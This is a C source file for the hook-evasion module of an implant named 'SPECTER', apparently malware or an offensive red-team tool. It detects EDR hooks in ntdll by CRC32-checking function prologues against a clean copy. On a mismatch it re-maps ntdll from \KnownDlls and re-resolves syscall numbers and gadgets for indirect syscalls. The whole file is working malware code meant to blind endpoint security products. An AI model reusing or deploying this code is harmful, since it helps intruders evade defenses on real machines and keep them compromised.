/**
 * SPECTER Implant — Hook Evasion & Integrity Monitoring
 *
 * CRC32-based hook detection for critical ntdll exports.  Computes
 * baseline CRC values from the clean ntdll mapping, then periodically
 * compares in-memory function prologues against the baseline.  On
 * mismatch (hook detected), re-maps a fresh ntdll from \KnownDlls,
 * re-resolves SSNs, and recomputes CRC baselines.
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "peb.h"

/* Current-process pseudo-handle */
#define NtCurrentProcess() ((HANDLE)(ULONG_PTR)-1)

/* External globals */
extern SYSCALL_TABLE g_syscall_table;

/* ------------------------------------------------------------------ */
/*  CRC32 implementation (IEEE 802.3 polynomial, no lookup table)       */
/* ------------------------------------------------------------------ */

/**
 * Compute CRC32 of the first `len` bytes at `func_addr`.
 * Uses bit-by-bit computation to avoid a 1KB lookup table (size matters
 * in a PIC blob).
 *
 * Polynomial: 0xEDB88320 (reversed representation of IEEE 802.3).
 */
DWORD evasion_compute_crc(PVOID func_addr, DWORD len) {
    if (!func_addr || len == 0)
        return 0;

    PBYTE data = (PBYTE)func_addr;
    DWORD crc = 0xFFFFFFFF;

    for (DWORD i = 0; i < len; i++) {
        crc ^= data[i];
        for (int bit = 0; bit < 8; bit++) {
            if (crc & 1)
                crc = (crc >> 1) ^ 0xEDB88320;
            else
                crc >>= 1;
        }
    }

    return crc ^ 0xFFFFFFFF;
}

/* ------------------------------------------------------------------ */
/*  evasion_init_crc_table — baseline CRC values from clean ntdll       */
/* ------------------------------------------------------------------ */

/**
 * Walk the syscall table's resolved entries, find each function in
 * the clean ntdll mapping, and compute a CRC32 baseline of the first
 * CRC_CHECK_BYTES at each function.  These baselines are later compared
 * against the in-memory (potentially hooked) copy.
 */
NTSTATUS evasion_init_crc_table(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    if (!ctx->clean_ntdll)
        return STATUS_UNSUCCESSFUL;

    spec_memset(&ctx->crc_table, 0, sizeof(CRC_TABLE));

    /* Iterate over all resolved syscall entries and compute CRC
       baselines from the clean ntdll mapping */
    for (DWORD i = 0; i < g_syscall_table.count; i++) {
        if (ctx->crc_table.count >= CRC_TABLE_CAPACITY)
            break;

        DWORD func_hash = g_syscall_table.entries[i].hash;

        /* Resolve function address in the clean ntdll */
        PVOID clean_addr = find_export_by_hash(ctx->clean_ntdll, func_hash);
        if (!clean_addr)
            continue;

        DWORD idx = ctx->crc_table.count;
        ctx->crc_table.entries[idx].func_hash  = func_hash;
        ctx->crc_table.entries[idx].func_addr  = clean_addr;
        ctx->crc_table.entries[idx].crc_value  = evasion_compute_crc(
            clean_addr, CRC_CHECK_BYTES);
        ctx->crc_table.count++;
    }

    if (ctx->crc_table.count == 0)
        return STATUS_UNSUCCESSFUL;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  evasion_refresh_ntdll — re-map clean ntdll from \KnownDlls          */
/* ------------------------------------------------------------------ */

/**
 * Unmap the current clean ntdll, map a fresh copy from \KnownDlls,
 * update the syscall table (re-find gadget, re-resolve SSNs), and
 * update the evasion context pointer.
 */
NTSTATUS evasion_refresh_ntdll(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    /* Unmap old clean ntdll if present */
    if (ctx->clean_ntdll) {
        spec_NtUnmapViewOfSection(NtCurrentProcess(), ctx->clean_ntdll);
        ctx->clean_ntdll = NULL;
        g_syscall_table.clean_ntdll = NULL;
    }

    /* Open \KnownDlls\ntdll.dll section */
    WCHAR knowndlls_path[] = { '\\','K','n','o','w','n','D','l','l','s',
                               '\\','n','t','d','l','l','.','d','l','l', 0 };
    UNICODE_STRING us_path;
    us_path.Buffer        = knowndlls_path;
    us_path.Length        = (USHORT)(spec_wcslen(knowndlls_path) * sizeof(WCHAR));
    us_path.MaximumLength = us_path.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE section_handle = NULL;
    NTSTATUS status = spec_NtOpenSection(&section_handle,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
    if (!NT_SUCCESS(status))
        return status;

    /* Map fresh copy */
    PVOID  clean_base = NULL;
    SIZE_T view_size  = 0;

    status = spec_NtMapViewOfSection(section_handle, NtCurrentProcess(),
        &clean_base, 0, 0, NULL, &view_size, ViewShare, 0, PAGE_READONLY);

    spec_NtClose(section_handle);

    if (!NT_SUCCESS(status))
        return status;

    /* Update pointers */
    ctx->clean_ntdll = clean_base;
    g_syscall_table.clean_ntdll = clean_base;

    /* Re-find syscall;ret gadget in fresh mapping */
    PVOID gadget = sc_find_gadget(clean_base);
    if (!gadget) {
        spec_NtUnmapViewOfSection(NtCurrentProcess(), clean_base);
        ctx->clean_ntdll = NULL;
        g_syscall_table.clean_ntdll = NULL;
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    /* Re-resolve SSNs for all cached entries */
    for (DWORD i = 0; i < g_syscall_table.count; i++) {
        DWORD hash = g_syscall_table.entries[i].hash;
        DWORD ssn  = sc_resolve_ssn(clean_base, hash);
        if (ssn != (DWORD)-1) {
            g_syscall_table.entries[i].ssn = ssn;
            g_syscall_table.entries[i].syscall_addr = gadget;
        }
    }

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  evasion_check_hooks — periodic hook detection                       */
/* ------------------------------------------------------------------ */

/**
 * Compare in-memory ntdll function prologues against clean baselines.
 * If any mismatch is detected:
 *   1. Re-map a fresh clean ntdll
 *   2. Re-resolve SSNs
 *   3. Recompute CRC baselines
 *
 * Returns TRUE if hooks were detected (and remediated), FALSE if clean.
 */
BOOL evasion_check_hooks(EVASION_CONTEXT *ctx) {
    if (!ctx || ctx->crc_table.count == 0)
        return FALSE;

    /* Find the live (in-memory, potentially hooked) ntdll base */
    PVOID live_ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!live_ntdll)
        return FALSE;

    BOOL hooks_detected = FALSE;

    /* Check each monitored function */
    for (DWORD i = 0; i < ctx->crc_table.count; i++) {
        DWORD func_hash = ctx->crc_table.entries[i].func_hash;

        /* Resolve function address in the live ntdll */
        PVOID live_addr = find_export_by_hash(live_ntdll, func_hash);
        if (!live_addr)
            continue;

        /* Compute CRC of in-memory function prologue */
        DWORD live_crc = evasion_compute_crc(live_addr, CRC_CHECK_BYTES);

        /* Compare against clean baseline */
        if (live_crc != ctx->crc_table.entries[i].crc_value) {
            hooks_detected = TRUE;
            break;  /* One mismatch is enough to trigger remediation */
        }
    }

    if (!hooks_detected)
        return FALSE;

    /* Hooks detected — remediate */

    /* Re-map clean ntdll from \KnownDlls */
    NTSTATUS status = evasion_refresh_ntdll(ctx);
    if (!NT_SUCCESS(status))
        return TRUE;  /* Detected but couldn't remediate */

    /* Recompute CRC baselines from fresh mapping */
    evasion_init_crc_table(ctx);

    return TRUE;
}
